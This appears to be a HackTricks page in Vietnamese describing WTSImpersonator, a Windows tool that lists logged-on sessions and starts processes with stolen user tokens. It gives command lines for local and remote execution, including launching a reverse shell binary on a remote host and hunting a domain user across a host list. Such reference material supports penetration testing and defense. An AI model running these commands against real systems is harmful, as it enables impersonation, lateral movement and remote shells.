# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, do Omri Baso phát triển, sử dụng các API Windows Terminal Services được cung cấp qua RPC named pipe `\\pipe\LSM_API_service` để liệt kê các phiên đã đăng nhập và khởi chạy tiến trình bằng token của người dùng được chọn. Công cụ hỗ trợ liệt kê và thực thi cục bộ, cũng như các quy trình dựa trên service từ xa.<sup>[[1]](#references)</sup>

## Chức năng chính

Luồng thực thi cục bộ của công cụ sử dụng chuỗi API sau:<sup>[[1]](#references)[[2]](#references)</sup>

```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```

## Các module và cách sử dụng

- **Liệt kê người dùng:** Công cụ có thể liệt kê các phiên trên máy cục bộ hoặc máy chủ từ xa.

  - Cục bộ:
    ```bash
    .\WTSImpersonator.exe -m enum
    ```
  - Từ xa, chỉ định địa chỉ IP hoặc tên máy chủ:
    ```bash
    .\WTSImpersonator.exe -m enum -s 192.168.40.131
    ```

- **Thực thi lệnh:** Các module `exec` và `exec-remote` cần ngữ cảnh dịch vụ. Microsoft ghi rõ rằng `WTSQueryUserToken` yêu cầu caller chạy với quyền `LocalSystem` và có đặc quyền `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

  - Thực thi lệnh cục bộ:
    ```bash
    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
    ```
  - PsExec có thể khởi chạy command prompt `LocalSystem` để kiểm thử:
    ```bash
    .\PsExec64.exe -accepteula -s cmd.exe
    ```

- **Thực thi lệnh từ xa:** Chế độ từ xa tạo một service trên máy đích theo quy trình tương tự PsExec, do đó cần có quyền cài đặt và khởi chạy service đó.<sup>[[1]](#references)</sup>

  - Ví dụ:
    ```bash
    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
    ```

- **Săn tìm người dùng:** Module `user-hunter` tìm kiếm trong danh sách host để tìm phiên của người dùng được chỉ định và cố gắng thực thi chương trình đã cung cấp trong ngữ cảnh đó.<sup>[[1]](#references)</sup>
  - Ví dụ sử dụng:
    ```bash
    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
    ```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: hàm `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
